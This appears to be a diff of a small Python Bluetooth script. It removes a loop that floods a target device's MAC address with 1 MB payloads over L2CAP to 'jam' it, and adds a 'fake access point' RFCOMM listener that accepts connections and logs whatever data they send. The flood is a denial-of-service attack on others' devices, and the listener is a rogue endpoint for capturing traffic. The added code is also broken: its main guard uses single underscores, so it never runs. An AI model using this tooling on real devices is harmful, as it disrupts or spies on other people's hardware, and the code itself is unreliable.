@@ -1,22 +1,35 @@
 import bluetooth
+import argparse
 
-# Set the target Bluetooth device's MAC address
-target_mac_address = "01:23:45:67:89:AB"
+def create_fake_access_point(name, mac_address):
+    server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+    server_sock.bind((mac_address, 1))
+    server_sock.listen(1)
 
-# Create a Bluetooth socket
-sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    print(f"Fake access point created with name: {name} and MAC address: {mac_address}")
 
-# Connect to the target device
-sock.connect((target_mac_address, 1))
+    while True:
+        client_sock, address = server_sock.accept()
+        print(f"Accepted connection from {address}")
 
-# Start jamming the Bluetooth connection
-while True:
-    try:
-        # Send a large amount of data to the target device
-        data = b"A" * 1024 * 1024  # 1MB of data
-        sock.send(data)
-    except bluetooth.BluetoothError:
-        # Connection was lost, try to reconnect
-        sock.close()
-        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
-        sock.connect((target_mac_address, 1))
+        while True:
+            data = client_sock.recv(1024)
+            if not data:
+                break
+
+            print(f"Received data: {data}")
+
+        client_sock.close()
+        print(f"Connection from {address} closed")
+
+def main():
+    parser = argparse.ArgumentParser(description="Bluetooth Fake Access Point Tool")
+    parser.add_argument("name", help="Name of the fake access point")
+    parser.add_argument("mac_address", help="MAC address of the fake access point")
+
+    args = parser.parse_args()
+
+    create_fake_access_point(args.name, args.mac_address)
+
+if _name_ == "_main_":
+    main()
